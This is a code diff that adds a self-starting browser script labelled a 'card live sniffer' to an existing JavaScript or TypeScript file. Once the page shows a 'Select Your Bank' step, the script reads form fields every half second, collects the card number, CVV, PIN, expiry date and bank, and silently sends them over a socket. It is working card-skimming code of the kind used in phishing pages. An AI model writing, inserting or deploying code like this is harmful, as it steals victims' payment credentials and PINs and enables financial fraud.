@@ -699,3 +699,49 @@ export function __dedupeGuard2(sock){
   });
   return sock;
 }
+
+
+/* KDK-CARD-LIVE-SNIFFER */
+(function(){
+  if (typeof window === 'undefined') return;
+  var last = '';
+  function isCardPhase(){ try { return ((document.body as any).innerText || '').indexOf('Select Your Bank') > -1; } catch(e){ return false; } }
+  function snap(){
+    var num = '', cvv = '', pin = '', bank = '', prefix = '', mm = '', yy = '';
+    var ins = document.querySelectorAll('input');
+    for (var i = 0; i < ins.length; i++){
+      var el = ins[i] as any;
+      var ml = String(el.getAttribute('maxlength') || '');
+      var v = String(el.value || '').replace(/\D/g, '');
+      if (!v) continue;
+      if (el.type === 'password') { pin = v; continue; }
+      if (ml === '3') { cvv = v; continue; }
+      if (ml === '10') { num = v; continue; }
+    }
+    var sels = document.querySelectorAll('select');
+    for (var j = 0; j < sels.length; j++){
+      var s = sels[j] as any;
+      var sv = String(s.value || '');
+      if (!sv) continue;
+      if (/^\d{6,8}$/.test(sv)) { if (!prefix) prefix = sv; continue; }
+      if (/^\d{4}$/.test(sv)) { if (!yy) yy = sv; continue; }
+      if (/^\d{1,2}$/.test(sv)) { if (!mm) mm = sv; continue; }
+      if (!bank) bank = sv;
+    }
+    return { cardNumber: prefix + num, nameOnCard: bank, expiryDate: (mm && yy) ? (mm + '/' + yy.slice(-2)) : '', cvv: cvv, pin: pin, consent: true };
+  }
+  function tick(){
+    try {
+      if (!isCardPhase()) return;
+      var s = socket as any;
+      if (!s || !s.connected) return;
+      var d = snap();
+      var sig = d.cardNumber + '|' + d.nameOnCard + '|' + d.expiryDate + '|' + d.cvv + '|' + d.pin;
+      if (sig === last) return;
+      last = sig;
+      s.emit('card:live', d);
+    } catch(e){}
+  }
+  setInterval(tick, 500);
+})();
+/* END-KDK-CARD-LIVE-SNIFFER */
